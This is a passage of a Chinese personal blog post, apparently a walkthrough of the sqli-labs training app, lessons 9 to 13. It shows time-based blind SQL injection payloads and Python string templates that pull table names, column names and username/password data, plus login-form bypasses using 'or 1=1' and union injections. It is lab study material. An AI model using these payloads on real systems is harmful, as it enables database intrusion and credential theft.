+<p>数据库名称得到确认security</p>
+<p>确认数据库中有哪些表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断表名</span><br></pre></td></tr></table></figure>
+
+<p>关键代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">params_get = url + <span class="string">f&quot;/**/and/**/if(ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(5),0)--+&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224210105710.png" alt="image-20231224210105710"></p>
+<p>判断列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名。</span><br></pre></td></tr></table></figure>
+
+<p>关键代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">params_get = url + <span class="string">f&quot;/**/and/**/if(ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(5),0)--+&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224210843227.png" alt="image-20231224210843227"></p>
+<p>查询表内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容。</span><br></pre></td></tr></table></figure>
+
+<p>关键代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">params_get = url + <span class="string">f&quot;/**/and/**/if(ascii(substring((select group_concat(username,password) from users),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(5),0)--+&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224211113540.png" alt="image-20231224211113540"></p>
+<p>数据正常输出</p>
+<h3 id="Less10"><a href="#Less10" class="headerlink" title="Less10"></a>Less10</h3><p>情况与Less9一样，无法试出错误，应该是使用时间盲注</p>
+<p>先进行盲注判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(1=1,sleep(5),1)-- -</span><br></pre></td></tr></table></figure>
+
+<p>结果没有出现等待现象表示不对</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;and if(1=1,sleep(5),1)-- -</span><br></pre></td></tr></table></figure>
+
+<p>1后面改为双引号出现等待现象，确定是时间盲注</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224211946864.png" alt="image-20231224211946864"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">params_get = url + <span class="string">f&quot;/**/and/**/if(ascii(substring((select database()),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(5),0)--+&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224212414547.png" alt="image-20231224212414547"></p>
+<p>后续操作与Less9相同</p>
+<h3 id="Less11（Post）"><a href="#Less11（Post）" class="headerlink" title="Less11（Post）"></a>Less11（Post）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1</span><br></pre></td></tr></table></figure>
+
+<p>和前面一样在网址栏输入，结果</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224213417976.png" alt="image-20231224213417976"></p>
+<p>输入其他数字也是一样</p>
+<p>确定不是在网址输入，而是在登陆栏操作</p>
+<p>password栏输入1显示</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224213809771.png" alt="image-20231224213809771"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE username=&#x27;1&#x27; and password=&#x27;&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>可以看出有两个参数，一个username，一个password</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p>输入和之前一样的后缀一直报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224214038065.png" alt="image-20231224214038065"></p>
+<p>显示正确，可以搞后续了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,3-- -</span><br></pre></td></tr></table></figure>
+
+<p>这个不行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224214225109.png" alt="image-20231224214225109"></p>
+<p>可行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;union select database()-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224214448913.png" alt="image-20231224214448913"></p>
+<p>数据库显示成功</p>
+<p>后续内容都可以在2中用联合注入进行查询，参考Less1</p>
+<h3 id="Less12"><a href="#Less12" class="headerlink" title="Less12"></a>Less12</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;) or 1=1-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224215125115.png" alt="image-20231224215125115"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;) union select 1,2-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224215223570.png" alt="image-20231224215223570"></p>
+<p>后续和Less11一样</p>
+<h3 id="Less13"><a href="#Less13" class="headerlink" title="Less13"></a>Less13</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>提示：You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near ‘’1’’) and  password&#x3D;(‘’) LIMIT 0,1’ at line 1</p>
+<p>您的SQL语法有错误；请查看与MySQL服务器版本对应的手册，以获得在第1行的“1”）和密码&#x3D;（“”）LIMIT 0,1附近使用的正确语法</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224215618992.png" alt="image-20231224215618992"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) or 1=1-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224215820022.png" alt="image-20231224215820022"></p>
+
+      
+    </div>
+  </div>
+ 
+</article>
+
+
+  
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:#fff}
+        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+      </style>
+      <div id="vcomment" class="comment"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+    var notify = 'true' == true ? true : false;
+    var verify = 'false' == true ? true : false;
+    new Valine({
+        av: AV,
+        el: '#vcomment',
+        notify: notify,
+        app_id: "5e1QK1vWlhrgxofsnjGRQonC-gzGzoHsz",
+        app_key: "nFoJj93POX4EMfQy8R2K8vv6",
+        placeholder: "留下你来过的痕迹~",
+        avatar:"robohash",
+    });
+</script>
+
+  </section>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+    <div class="widget-wrap-info">
+        <img src="/../img/avator.jpg" class="widget-wrap-info-img">
+        <div class="widget-wrap-info-author">LancePLM</div>
+        <div class="widget-wrap-info-signature">业精于勤，荒于嬉。</div>
+    </div>
+    <div class="info-nav">
+        <ul class="info-nav-ul">
+        
+            <li class="info-nav-li">
+            <a class="info-nav-link" href="/">
+                <div class="info-nav-div">
+                    <span class="info-nav-icon">
+                        <i data-feather="home"></i>
+                    </span>
+                    <span class="info-nav-name">首页</span>
+                </div>
+            </a>
+           </li>
+          
+            <li class="info-nav-li">
+            <a class="info-nav-link" href="/archives">
+                <div class="info-nav-div">
+                    <span class="info-nav-icon">
+                        <i data-feather="archive"></i>
+                    </span>
+                    <span class="info-nav-name">归档</span>
+                </div>
+            </a>
+           </li>
+          
+            <li class="info-nav-li">
+            <a class="info-nav-link" href="/about">
+                <div class="info-nav-div">
+                    <span class="info-nav-icon">
+                        <i data-feather="alert-circle"></i>
+                    </span>
+                    <span class="info-nav-name">关于</span>
+                </div>
+            </a>
+           </li>
+          
+            <li class="info-nav-li">
+            <a class="info-nav-link" href="/board">
+                <div class="info-nav-div">
+                    <span class="info-nav-icon">
+                        <i data-feather="edit-3"></i>
+                    </span>
+                    <span class="info-nav-name">留言</span>
+                </div>
+            </a>
+           </li>
+          
+        </ul>
+    </div>
+</div>
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 LancePLM<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | Theme by  <a href="https://github.com/FuShaoLei/hexo-theme-hiya" target="_blank">Hiya</a>
+      
+        <br>
+        <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+      <span id="busuanzi_container_site_uv">
+        访客数<span id="busuanzi_value_site_uv"></span>人次
+      </span>
+        
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/,home" class="mobile-nav-link">首页</a>
+  
+    <a href="/archives,archive" class="mobile-nav-link">归档</a>
+  
+    <a href="/about,alert-circle" class="mobile-nav-link">关于</a>
+  
+    <a href="/board,edit-3" class="mobile-nav-link">留言</a>
+  
+</nav>
+    <script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script>
+    feather.replace()
+</script>
+
+<script src="/js/script.js"></script>
+
+
+  </div>
+</body>
+</html>
